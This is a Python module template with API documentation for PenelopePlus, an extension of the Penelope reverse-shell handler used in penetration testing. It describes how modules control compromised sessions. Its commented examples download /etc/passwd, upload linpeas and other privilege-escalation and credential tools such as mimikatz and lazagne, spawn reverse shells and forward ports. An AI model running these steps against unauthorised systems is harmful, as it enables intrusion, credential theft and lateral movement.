"""
PenelopePlus module template.

Drop this file (renamed) into modules/ and run install.sh.
The class name becomes the module name shown in penelope's `run` command.

━━━ MODULE CLASS ATTRIBUTES ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  category         = "Misc"  - Group shown in `run` listing. Use any string.
  enabled          = True    - Set False to disable without removing the file.
  os_filter        = None    - 'Unix' | 'Windows' | None. Hides module from listing
                               when attached session OS doesn't match.
  on_session_start = False   - Auto-run when a new session is first established.
  on_first_attach  = False   - Auto-run on the first interactive attach.
  on_session_end   = False   - Auto-run when session is about to die.

  When triggered by a hook, args is None. Check before parsing.

━━━ SESSION ATTRIBUTES ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ── Identity ──────────────────────────────────────────────────────────────────
    session.id            int   - unique session ID
    session.name          str   - "hostname~ip-system" display name
    session.name_colored  str   - same, with ANSI colour codes
    session.user          str   - remote user, e.g. "www-data(33)"
    session.shell_pid     str   - remote shell PID (numeric string)
    session.tty           str   - remote TTY, e.g. "/dev/pts/0" (Unix only)

  ── Network ───────────────────────────────────────────────────────────────────
    session.ip            str            - remote IP
    session.port          int            - remote port of initial connection
    session._host         str            - penelope listener IP (attacker side)
    session._port         int            - penelope listener port
    session.source        str            - 'reverse' | 'bind'
    session.listener      TCPListener|None - None for bind shells
    session.latency       float|None     - connection latency

  ── System info ───────────────────────────────────────────────────────────────
    session.OS            str       - 'Unix' | 'Windows' | None
    session.hostname      str       - remote hostname
    session.arch          str       - e.g. 'x86_64' (Unix) / 'x64-based_PC' (Windows)
    session.system        str       - OS version/name string
    session.cwd           str       - current remote working dir (lazy, queried once per attach)
    session.tmp           str|False - writable remote temp dir (lazy); False if none found
    session.win_version   str|None  - Windows version string, e.g. "10.0.19045" (Windows only)
    session.systeminfo    str|None  - raw `systeminfo` output (Windows only)

  ── Shell state ───────────────────────────────────────────────────────────────
    session.type                str   - 'Raw' | 'PTY' | 'Readline'
    session.subtype             None|'cmd'|'psh'   - Windows shell flavour only
    session.interactive         bool  - shell presents a prompt
    session.echoing             bool  - shell echoes input
    session.agent               bool  - Python agent is deployed (full-duplex, enables exec python=)
    session.pty_ready           bool  - shell already has PTY (even without agent)
    session.can_deploy_agent    bool (property) - remote Python available and agent not yet blocked
    session.new                 bool  - session not yet upgraded/attached for the first time
    session.is_attached         bool  (property) - currently the active attached session
    session.prompt              bytes - last captured shell prompt bytes

  ── Binaries (Unix) ───────────────────────────────────────────────────────────
    session.bin           dict  - binary name → absolute remote path ('' if absent)
    Keys: 'sh', 'bash', 'python', 'python3', 'uname', 'script', 'socat',
          'tty', 'echo', 'base64', 'wget', 'curl', 'tar', 'rm', 'stty',
          'setsid', 'find', 'nc'
    Usage: if session.bin['bash']: ...

  ── Local session storage ─────────────────────────────────────────────────────
    session.directory       Path  - ~/.penelope/sessions/<name>/
    session.logpath         Path  - per-session log file inside session.directory
    session.uploaded_paths  dict - {remote_path_str: unix_timestamp} of uploads this session
    session.tasks           dict  - {'portfwd': [...], 'scripts': [...]} active background tasks

  ── Advanced / agent-only ─────────────────────────────────────────────────────
    session.remote_python_version  tuple - (major, minor, micro); available after
                                          session.can_deploy_agent is accessed

━━━ SESSION METHODS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  session.exec(cmd, value=False, timeout=False, raw=False, force_cmd=False)
      Run shell command on remote.
        value=True   → wait and return stdout+stderr as str (stripped).
        value=False  → fire-and-forget, returns True on success.
        timeout=N    → override timeout in seconds; False = use short_timeout when value=True.
        raw=True     → no delimiter tokens, return raw bytes buffer; use when cmd is noisy.
        force_cmd=True → execute via cmd.exe even if shell is PowerShell (Windows).

      Agent-only kwargs (session.agent must be True):
        python=True           → execute cmd as Python code inside the agent interpreter.
        agent_typing=False    → send cmd via the shell stdin instead of exec channel.
        stdin_src=<file-like> → pipe data into remote stdin.
        stdout_dst=<file-like>→ stream remote stdout to a local file/socket.
        stderr_dst=<file-like>→ stream remote stderr to a local file/socket.

  session.upload(local_items, remote_path=None, randomize_fname=False, url_to_bytes_fn=None)
      Upload file(s) to remote. local_items is a space-separated string of local
      paths, globs, or URLs. Returns list of quoted remote path strings.
        remote_path=None      → upload to session.cwd.
        randomize_fname=True  → append random suffix to avoid collisions.
        url_to_bytes_fn=fn    → override URL fetch+extract. Signature:
                                  fn(url) -> (filename_str, bytes)
                                Used to pull a single binary out of an archive:
                                  url_to_bytes_fn=lambda x: ('agent', zipf.read('agent'))

  session.download(remote_items)
      Download file(s) / globs from remote. Returns list of local Path objects.
      Files land in session.directory/downloads/.

  session.spawn(port=None, host=None)
      Spawn a new reverse shell back to penelope.
        No args        → uses current listener (session._host / session._port).
        spawn(4444)    → new listener on port 4444 (same host).
        spawn(4444, '10.10.10.1') → specific host:port.

  session.write_access(path)
      Returns True if path is writable on remote, False if denied, None on error.

  session.upgrade()
      Try to upgrade: Raw → PTY → Python agent. Returns bool.
      Automatically called on first attach unless options.no_upgrade is set.

  session.script(local_script)          *** agent only ***
      Run a local script (path or URL) on remote via the agent. Script must have
      a valid shebang line. Opens a terminal tail of the output automatically.
      Returns local output file Path or False.

  session.portfwd(_type, lhost, lport, rhost, rport)  *** agent only ***
      Set up port forwarding via the agent.
        _type='L'  → local forward:  lhost:lport → rhost:rport (on remote)
        _type='R'  → remote forward: rhost:rport → lhost:lport (on local)

  session.need_binary(name, url)
      Interactive prompt: upload from URL / provide local path / give remote path.
      Returns remote path string or False. Useful when a binary may be missing.

  session.kill()
      Close and remove this session. Triggers on_session_end hooks first.

  session.attach()  /  session.detach()
      Attach/detach the interactive terminal to/from this session.

  session.sync_cwd()
      Resync the cached session.cwd with the actual remote working directory.

━━━ PENELOPE GLOBALS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ── logger ────────────────────────────────────────────────────────────────────
    penelope.logger.debug(msg)    # [DEBUG] magenta - only shown in debug mode
    penelope.logger.trace(msg)    # [•]     cyan    - between INFO and DEBUG (level 25)
    penelope.logger.info(msg)     # [+]     green
    penelope.logger.warning(msg)  # [!]     yellow
    penelope.logger.error(msg)    # [-]     red
    penelope.logger.critical(msg) # [!!!]   RED (bold)
    All levels also write to the penelope log file on disk.

  ── Interactive input ─────────────────────────────────────────────────────────
    penelope.ask(prompt)           → str: show yellow "[?] prompt" and read a line.

  ── Coloured terminal output ──────────────────────────────────────────────────
    penelope.paint(text).colour    → str with ANSI escape codes, use inside print().
    Foreground colours: black red green yellow blue magenta cyan orange white
                        lightgrey darkgrey
    Background (UPPER):   BLACK RED GREEN YELLOW BLUE MAGENTA CYAN WHITE
    Style codes:          BRIGHT DIM UNDERLINE BLINK NORMAL
    Combine with _:  paint("text").white_BLUE  (white text on blue background)
    Example: print(penelope.paint("owned").green)

  ── Session registry ──────────────────────────────────────────────────────────
    penelope.core.sessions         dict  {id: Session}
    penelope.core.hosts            dict  {name: [Session, ...]}  (defaultdict)
    penelope.core.listeners        dict  {id: TCPListener}
    penelope.core.fileservers      dict  {id: FileServer}
    penelope.core.attached_session Session|None - currently interactive session

  ── Listener constructor ──────────────────────────────────────────────────────
    penelope.TCPListener(host, port)   → start a new listener (also aliased as penelope.Listener)

  ── Built-in tool URLs ────────────────────────────────────────────────────────
    penelope.URLS   dict of pre-defined tool download URLs.
    Common keys: 'linpeas', 'winpeas_bat', 'winpeas_any', 'lse', 'pspy32',
                 'pspy64', 'powerup', 'privesccheck', 'socat', 'ncat',
                 'chisel_amd64', 'chisel_arm64', 'chisel_386',
                 'ligolo_amd64', 'ligolo_arm64', 'godpotato', 'sigmapotato',
                 'printspoofer64', 'printspoofer32', 'mimikatz', 'lazagne',
                 'sharphound', 'powerview', 'traitor_amd64', 'panix', ...
    Usage: session.upload(penelope.URLS['linpeas'], remote_path=session.tmp)

  ── Global options (read/write) ───────────────────────────────────────────────
    penelope.options.basedir                Path  - ~/.penelope/
    penelope.options.maintain               int   - target shell count per host (default 1)
    penelope.options.single_session         bool
    penelope.options.no_log                 bool
    penelope.options.no_timestamps          bool
    penelope.options.no_attach              bool
    penelope.options.no_upgrade             bool
    penelope.options.debug                  bool
    penelope.options.latency                float - continuation timeout (default 0.01)
    penelope.options.short_timeout          int   - command timeout in seconds (default 4)
    penelope.options.long_timeout           int   - long operation timeout (default 60)
    penelope.options.network_buffer_size    int - socket read size (default 16384)
    penelope.options.upload_chunk_size      int - bytes per upload chunk (default 51200)
    penelope.options.download_chunk_size    int - bytes per download chunk (default 1048576)
    penelope.options.useragent              str   - HTTP user-agent for URL fetches
    penelope.options.upload_random_suffix   bool - always randomize uploaded filenames

  ── Raw stdout write ──────────────────────────────────────────────────────────
    penelope.stdout(data_bytes, record=True)
        Write raw bytes directly to the terminal. record=True also pushes to the
        session line buffer (used to replay output on re-attach).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

import penelope

# Required: must subclass penelope.Module
class template_module(penelope.Module):

    # Module category shown in `run` listing
    category = "Misc"

    # Set False to disable without deleting the file
    enabled = False

    # 'Unix' | 'Windows' | None - hides module in listing when OS doesn't match
    os_filter = None

    # Set True to auto-run when a session is first established
    on_session_start = False

    # Set True to auto-run on first interactive attach
    on_first_attach = False

    # Set True to auto-run when session ends
    on_session_end = False

    def run(session, args=None):
        """
        One-line description shown in `run` listing.

        Extended help shown when user runs: run template_module --help
        args is a string of everything the user typed after the module name,
        or None when triggered by a hook (on_session_start / on_first_attach / on_session_end).
        """

        # Guard: hook calls pass args=None - parse only when user-invoked
        if args is None:
            return

        # Guard on OS if module is platform-specific
        if session.OS != 'Unix':
            penelope.logger.error("Unix only")
            return

        # ── exec: run command, capture output ─────────────────────────────────
        output = session.exec("id", value=True)
        if output:
            print(output)

        # ── exec: agent Python execution ──────────────────────────────────────
        # if session.agent:
        #     result = session.exec("stdout_stream << os.getcwd().encode()", python=True, value=True)

        # ── upload a local file or URL ─────────────────────────────────────────
        # session.upload("/path/to/file", remote_path=session.tmp)
        # session.upload(penelope.URLS['linpeas'], remote_path=session.tmp)

        # ── download a remote file ────────────────────────────────────────────
        # paths = session.download("/etc/passwd")

        # ── spawn a new session ───────────────────────────────────────────────
        # session.spawn()          # use current listener
        # session.spawn(4444)      # new reverse shell on port 4444

        # ── port forwarding (agent only) ──────────────────────────────────────
        # session.portfwd('L', '127.0.0.1', 8080, '192.168.1.10', 80)

        # ── interactive binary locate/upload ──────────────────────────────────
        # path = session.need_binary("chisel", penelope.URLS['chisel_amd64'])
        # if not path:
        #     return

        # ── logger levels ─────────────────────────────────────────────────────
        # penelope.logger.info("module done")
        # penelope.logger.warning("something odd")
        # penelope.logger.error("something failed")
        # penelope.logger.trace("verbose step detail")   # [•] cyan
        # penelope.logger.debug("low-level debug info")  # only shown in debug mode

        # ── coloured print ────────────────────────────────────────────────────
        # print(penelope.paint(f"user: {session.user}").green)

        # ── interactive prompt ────────────────────────────────────────────────
        # answer = penelope.ask("Enter target port: ")

        # ── enumerate all sessions ────────────────────────────────────────────
        # for sid, s in penelope.core.sessions.items():
        #     penelope.logger.info(f"Session {sid}: {s.name} ({s.OS})")

        # ── parse args (args is a str or None when hook-triggered) ────────────
        # if args and "--verbose" in args:
        #     ...
